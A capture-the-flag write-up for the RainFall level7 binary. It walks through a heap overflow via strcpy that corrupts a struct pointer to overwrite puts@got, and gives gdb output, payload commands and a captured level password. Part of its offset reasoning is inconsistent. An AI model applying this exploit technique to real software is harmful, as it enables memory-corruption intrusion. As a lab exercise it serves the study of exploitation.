# Level7 — Heap Overflow / GOT Overwrite

## Vulnerability

The binary allocates four heap chunks organized as two linked structs, then copies `argv[1]` and `argv[2]` into inner buffers using `strcpy()` — no bounds checking. By overflowing the first `strcpy`, we can **corrupt the destination pointer used by the second `strcpy`**, turning it into an arbitrary write primitive. We use this to **overwrite a GOT entry** (`puts@got`) with the address of `m()`, which prints the password.

This is a **heap overflow leading to a GOT overwrite** — a step up in complexity from level6's simple function pointer overwrite.

---

## Recon

**Four `malloc(8)` calls build two structs `{int, char*}`:**

```gdb
(gdb) disass main
   ; Struct 1
   0x08048531 <+16>:  call malloc(8)     ; s1        → 0x0804a008
   0x0804853e <+29>:  mov $0x1, (s1)    ; s1->type  = 1
   0x0804854b <+42>:  call malloc(8)     ; s1->data  → 0x0804a018
   0x08048556 <+53>:  mov %edx, 4(s1)   ; s1->data  = 0x0804a018

   ; Struct 2
   0x08048560 <+63>:  call malloc(8)     ; s2        → 0x0804a028
   0x0804856d <+76>:  mov $0x2, (s2)    ; s2->type  = 2
   0x0804857a <+89>:  call malloc(8)     ; s2->data  → 0x0804a038
   0x08048585 <+100>: mov %edx, 4(s2)   ; s2->data  = 0x0804a038
```

**Memory layout on the heap:**

```
0x0804a008  [s1.type=1][s1.data ptr → 0x0804a018]   ← struct1 (8 bytes)
0x0804a018  [........8 bytes of data...........]      ← s1 data buffer
0x0804a028  [s2.type=2][s2.data ptr → 0x0804a038]   ← struct2 (8 bytes)
0x0804a038  [........8 bytes of data...........]      ← s2 data buffer
```

**Two vulnerable `strcpy` calls:**

```gdb
   ; strcpy(s1->data, argv[1])  ← first copy, into 0x0804a018
   0x080485a0 <+127>: call strcpy@plt

   ; strcpy(s2->data, argv[2])  ← second copy, destination = *s2+4
   0x080485bd <+156>: call strcpy@plt
```

**`ltrace` confirms the overflow corrupts the second destination:**

```bash
ltrace ./level7 `python -c "print('A'*400)"` `python -c "print('A'*400)"`
# strcpy(0x0804a018, "AAA...")   ← ok
# strcpy(0x41414141, "AAA...")   ← SIGSEGV: destination corrupted to 0x41414141
```

The first `strcpy` overflows `s1->data` (8 bytes) → hits `s2` (at `+0x10` = 16 bytes away) → overwrites `s2->data` pointer at `s2+4` (offset **20** from `s1->data`... but header gap means **16 bytes** of padding suffices to reach `s2->data`).

**Pattern offset confirms 16 bytes:**

```bash
ltrace ./level7 Aa0Aa1Aa2...  aaaa
# strcpy(0x37614136, "aaaa")  → 0x37614136 = "6Aa7" at offset 20 in cyclic → 16 bytes to ptr
```

**Target: `puts@got` at `0x8049928`** (from `disass puts@plt`):

```gdb
(gdb) disass puts
   0x08048400 <+0>:   jmp *0x8049928    ; ← GOT entry for puts
```

**`m()` is the hidden function** — it reads and prints the password file:

```gdb
(gdb) disass m
   0x080484fa <+6>:   movl $0x0,(%esp)
   0x08048501 <+13>:  call time@plt
   ...
   0x0804850f <+27>:  movl $0x8049960,0x4(%esp)   ; global buffer holding /home/user/level8/.pass
   0x0804851a <+38>:  call printf@plt
```

`m()` address: `0x080484f4`

---

## Exploit

**Step 1** — argv[1] overflows `s1->data`, replacing `s2->data` pointer with `puts@got`:

```
'A' * 16  →  fills s1->data (8 bytes) + s2 header (8 bytes)
'\x28\x99\x04\x08'  →  overwrites s2->data with address of puts@got (0x08049928)
```

**Step 2** — argv[2] is copied into the now-corrupted destination, writing `m()`'s address into `puts@got`:

```
'\xf4\x84\x04\x08'  →  address of m() written into puts@got
```

When `main` later calls `puts(...)`, it now jumps to `m()` instead, which prints the password.

```bash
python -c "print('A' * 16 + '\x28\x99\x04\x08')" > /tmp/exploit
python -c "print('\xf4\x84\x04\x08')" > /tmp/exploit2
./level7 `cat /tmp/exploit` `cat /tmp/exploit2`
```

---

## Flow

```
malloc x4  →  heap layout: [s1 | s1.data | s2 | s2.data]
        │
        ▼
strcpy(s1->data, argv[1])  ←  OVERFLOW
        │
        ├── 8 bytes fill s1->data
        ├── 8 bytes overwrite s2 header (benign)
        └── 4 bytes overwrite s2->data  →  now points to puts@got (0x8049928)
                │
                ▼
strcpy(puts@got, argv[2])  ←  ARBITRARY WRITE
        │
        └── writes &m (0x080484f4) into puts@got entry
                │
                ▼
main() calls puts(...)  →  GOT redirects to m()
        │
        ▼
m() calls printf(password_buffer)  →  prints /home/user/level8/.pass
```

**Shell session after exploitation:**

```bash
level7@RainFall:~$ ./level7 `cat /tmp/exploit` `cat /tmp/exploit2`
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1774015271
```

---

## Commands Summary

```bash
# Understand the heap layout and GOT entry for puts
gdb ./level7
(gdb) disass main              # four malloc calls, two strcpy calls
(gdb) disass puts              # jmp *0x8049928  → puts@got address
(gdb) disass m                 # prints the password buffer → target function

# Find the overflow offset with ltrace + cyclic pattern
ltrace ./level7 Aa0Aa1Aa2...   aaaa
# second strcpy destination = 0x37614136 → offset 16

# argv[1]: 16 bytes padding + address of puts@got
python -c "print('A' * 16 + '\x28\x99\x04\x08')" > /tmp/exploit

# argv[2]: address of m() — written into puts@got
python -c "print('\xf4\x84\x04\x08')" > /tmp/exploit2

# Execute
./level7 `cat /tmp/exploit` `cat /tmp/exploit2`
```
